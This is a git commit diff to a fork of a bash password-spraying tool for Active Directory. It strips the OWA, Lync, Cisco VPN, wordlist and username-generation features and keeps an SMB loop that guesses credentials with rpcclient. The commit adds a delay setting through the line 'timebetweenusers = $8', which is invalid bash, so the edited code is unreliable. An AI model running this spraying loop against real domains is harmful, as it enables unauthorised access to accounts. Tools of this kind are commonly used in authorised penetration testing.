a86c6f1fdde66655c65fa4356fa044d67aee909c
Lee Berg <leeberg@outlook.com>
2019-04-12 14:03:37 -0500

    Further Clean / Optimze for Demo

--- README.md
+++ README.md
@@ -1,6 +1,6 @@
-# Spray
+# Lee Spray
 
-A Password Spraying tool for Active Directory Credentials by Jacob Wilkin(Greenwolf)
+A Fork from the Password Spraying tool for Active Directory Credentials by Jacob Wilkin(Greenwolf)
 
 ## Getting Started
 
@@ -18,6 +18,9 @@ curl
 
 ## Using Spray
 
+Simply use the "startspray.sh" script to use the preset usernames and passwords lists. You will need to update the ip and domain specified in start script for your domain.
+
+
 This script will password spray a target over a period of time
 It requires password policy as input so accounts are not locked out
 
@@ -34,64 +37,6 @@ per lockout period, lockout period length and the domain must be provided
 ```
 Useage: spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 Example: spray.sh -smb 192.168.0.1 users.txt passwords.txt 1 35 SPIDERLABS
-```
-
-### OWA
-
-To password spray an OWA portal, a file must be created of the POST 
-request with the Username: sprayuser@domain.com, and Password: spraypassword
-
-```
-Useage: spray.sh -owa <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <RequestsFile>
-Example: spray.sh -owa 192.168.0.1 users.txt passwords.txt 1 35 post-request.txt
-```
-
-### Lync
-
-To password spray a lync service, a lync autodiscover url or a url that 
-returns the www-authenticate header must be provided along with a list of email addresses
-
-```
-Useage: spray.sh -lync <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes>
-Example: spray.sh -lync https://lyncdiscover.spiderlabs.com/ users.txt passwords.txt 1 35
-Example: spray.sh -lync https://lyncweb.spiderlabs.com/Autodiscover/AutodiscoverService.svc/root/oauth/user users.txt passwords.txt 1 35
-```
-
-### CISCO Web VPN
-
-To password spray a CISCO Web VPN service, a target portal or server 
-hosting a portal must be provided
-
-```
-Useage: spray.sh -cisco <targetURL> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes>
-Example: spray.sh -ciso 192.168.0.1 usernames.txt passwords.txt 1 35
-```
-
-### Password List Update
-
-It is also possible to update the supplied 2016/2017 
-password list to the current year
-
-```
-Useage: spray.sh -passupdate <passwordList>
-Example: spray.sh -passupdate passwords.txt
-```
-
-An optional company name can also be provided to add to the list
-
-```
-Useage: spray.sh -passupdate <passwordList> <CompanyName>
-Example: spray.sh -passupdate passwords.txt Spiderlabs
-```
-
-### Username generation
-
-A username list can also be generated from a list of common names
-
-```
-Useage: spray.sh -genusers <firstnames> <lastnames> "<<fi><li><fn><ln>>"
-Example: spray.sh -genusers english-first-1000.txt english-last-1000.txt "<fi><ln>"
-Example: spray.sh -genusers english-first-1000.txt english-last-1000.txt "<fn>.<ln>"
 ```
 
 ## Authors
--- spray.sh
+++ spray.sh
@@ -7,100 +7,14 @@ if [ $# -eq 0 ] || [ "$1" == "-help" ] || [ "$1" == "-h" ] || [ "$1" == "--help"
     echo "It requires password policy as input so accounts are not locked out"
     echo "Useage: spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <Domain>"
     echo -e "Example: spray.sh -smb 192.168.0.1 users.txt passwords.txt 1 35 CORPORATION\n"
-
-    echo "To password spray an OWA portal, a file must be created of the POST request with Username: sprayuser@domain.com, and Password: spraypassword"
-    echo "Useage: spray.sh -owa <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <RequestFile>"
-    echo -e "Example: spray.sh -owa 192.168.0.1 usernames.txt passwords.txt 1 35 post-request.txt\n"
-
-    echo "To password spray an lync service, a lync autodiscover url or a url that returns the www-authenticate header must be provided along with a list of email addresses"
-    echo "Useage: spray.sh -lync <lyncDiscoverOrAutodiscoverUrl> <emailAddressList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes>"
-    echo "Example: spray.sh -lync https://lyncdiscover.company.com/ emails.txt passwords.txt 1 35\n"
-    echo -e "Example: spray.sh -lync https://lyncweb.company.com/Autodiscover/AutodiscoverService.svc/root/oauth/user emails.txt passwords.txt 1 35\n"
-
-    echo "To password spray an CISCO Web VPN a target portal or server hosting a portal must be provided"
-    echo "Useage: spray.sh -cisco <targetURL> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes>"
-    echo -e "Example: spray.sh -cicso 192.168.0.1 usernames.txt passwords.txt 1 35\n"
-
-    echo -e "\nIt is also possible to update the supplied 2016/2017 password list to the current year"
-    echo "Useage: spray.sh -passupdate <passwordList>"
-    echo "Example: spray.sh -passupdate passwords.txt"
-    echo -e "\nAn optional company name can also be provided to add to the list:"
-    echo "Useage: spray.sh -passupdate <passwordList> <CompanyName>"
-    echo "Example: spray.sh -passupdate passwords.txt Company"
-
-    echo -e "\nA username list can also be generated from a list of common names:"
-    echo "Useage: spray.sh -genusers <firstnames> <lastnames> \"<<fi><li><fn><ln>>\""
-    echo "Example: spray.sh -genusers english-first-1000.txt english-last-1000.txt \"<fi><ln>\""
-    echo "Example: spray.sh -genusers english-first-1000.txt english-last-1000.txt \"<fn>.<ln>\""
-
     echo ""
-    exit 0
-fi
-
-if [ "$1" == "-passupdate" ] || [ "$1" == "--passupdate" ] || [ "$1" == "passupdate" ] ; then
-
-    if [ $# -eq 3 ] ; then 
-        touch temp-passwords.txt
-        echo "$31" >> temp-passwords.txt
-        echo "$316" >> temp-passwords.txt
-        echo "$317" >> temp-passwords.txt
-        echo "$32016" >> temp-passwords.txt
-        echo "$32017" >> temp-passwords.txt
-        cat $2 >> temp-passwords.txt
-        rm $2
-        mv temp-passwords.txt $2
-    fi
-
-    echo -n "Updating Password List... "
-    longdate1=$(date +%Y)
-    longdate2=$(($longdate1-1))
-    shortdate1=$(date +%y)
-    if [ "$shortdate1" == "00" ] ; then
-    	shortdate2="99"
-    else
-    	shortdate2=$(($shortdate1-1))
-    fi
-    
-    #sed -i.bak s/2017/$longdate1/g $2
-
-    #sed -i.bak s/2016/$longdate2/g $2
-    sed -i.bak s/17/$shortdate1/g $2
-    sed -i.bak s/16/$shortdate2/g $2
-    echo "Complete"
-    exit 0
-fi
-
-if [ "$1" == "-genusers" ] || [ "$1" == "--genusers" ] || [ "$1" == "genusers" ] ; then
-    #spray.sh -genusers <firstnames> <lastnames> "<UsernameFormat>""
-    touch generated-usernames.tmp
-    echo "Generating Username list..."
-    for firstname in $(cat $2); do 
-        for lastname in $(cat $3); do 
-            fi=${firstname:0:1}
-            li=${lastname:0:1}
-            echo "$4" | sed "s/<fi>/$fi/" | sed "s/<li>/$li/" | sed "s/<fn>/$firstname/" | sed "s/<ln>/$lastname/" >> generated-usernames.tmp
-        done
-    done
-    cat generated-usernames.tmp | sort -u > generated-usernames.txt
-    rm generated-usernames.tmp
-    echo -e "Username list generated in generated-usernames.txt\n"
-    exit 0
-fi
-
-if [ "$1" == "-calc-throttle" ] || [ "$1" == "--calc-throttle" ] || [ "$1" == "calc-throttle" ] ; then
-    numusers=$(cat $2 | wc -l | sed 's/ //g')
-    lockouttime=$3
-    throttletime=$(($lockouttime*60*10000/$numusers))
-    echo "To spray $numusers users over $lockouttime minutes,"
-    echo "Intruder Throttle(milliseconds) should be: $throttletime"
-    echo "Threads should be: 1"
     exit 0
 fi
 
 if [ $# -lt 5 ] ; then
     echo "Not Enough Arguments"
     echo "Useage: spray.sh <targetIP> <usernameList> <passwordList> <LockoutThreshold> <LockoutResetTimerInMinutes>"
-    echo -e "Example: spray.sh 192.168.0.1 users.txt passwords.txt 4 30\n"
+    echo -e "Example: spray.sh 192.168.0.1 users.txt passwords.txt 4 30 1\n"
     exit 0
 fi
 
@@ -109,6 +23,7 @@ fi
 if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
     mkdir -p logs
     set +H
+    timebetweenusers = $8
     domain=$7
     target=$2
     cp $3 logs/username-removed-successes.txt
@@ -135,7 +50,7 @@ if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
     	for u in $(cat $userslist); do 
             (echo "$time : Spraying user: $u with password: $password")
             (echo -n "[*] user $u%$password " && rpcclient -U "$domain/$u%$password" -c "getusername;quit" $target) >> logs/spray-logs.txt
-            sleep 1
+            sleep $timebetweenusers
     	done
         cat logs/spray-logs.txt | grep -v "Cannot"
         cat logs/spray-logs.txt | grep -v "Cannot" | cut -d ' ' -f 3 | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
